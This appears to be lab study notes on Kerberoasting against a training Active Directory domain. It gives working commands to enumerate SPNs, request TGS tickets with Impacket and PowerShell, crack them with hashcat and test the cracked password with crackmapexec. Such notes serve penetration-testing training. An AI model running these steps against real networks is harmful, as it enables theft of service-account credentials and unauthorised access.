## Table of Contents

  - [Kerberoasting - Performing the Attack](#Kerberoasting\-\Performing\the\Attack)
  - [Kerberoasting with GetUserSPNs.py](#Kerberoasting\with\GetUserSPNs.py)
      - [Listing SPN Accounts with GetUserSPNs.py](#Listing\SPN\Accounts\with\GetUserSPNs.py)
      - [Requesting all TGS Tickets](#Requesting\all\TGS\Tickets)
      - [Requesting a Single TGS ticket](#Requesting\a\Single\TGS\ticket)
      - [Cracking the Ticket Offline with Hashcat](#Cracking\the\Ticket\Offline\with\Hashcat)
      - [Testing Authentication against a Domain Controller](#Testing\Authentication\against\a\Domain\Controller)
  - [Kerberoasting - Semi Manual method](#Kerberoasting\-\Semi\Manual\method)
      - [Enumerating SPNs with setspn.exe](#Enumerating\SPNs\with\setspn.exe)
      - [Targeting a Single User](#Targeting\a\Single\User)

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.


Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

## Kerberoasting with GetUserSPNs.py

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.





**Start By Gathering a listing of SPN's within the domain**
	will need a set of valid domain credentials and the IP address of a Domain Controller
#### Listing SPN Accounts with GetUserSPNs.py

  Listing SPN Accounts with GetUserSPNs.py

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

#### Requesting all TGS Tickets

  Requesting all TGS Tickets

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.

#### Requesting a Single TGS ticket

  Requesting a Single TGS ticket

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```


#### Cracking the Ticket Offline with Hashcat

  Cracking the Ticket Offline with Hashcat

```shell
gdxqpardo@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

#### Testing Authentication against a Domain Controller

  Testing Authentication against a Domain Controller

```shell
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to enumerate SPNs in the domain.

#### Enumerating SPNs with setspn.exe

  Enumerating SPNs with setspn.exe

```cmd-session
C:\htb> setspn.exe -Q */*
```
#### Targeting a Single User

  Targeting a Single User

```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

























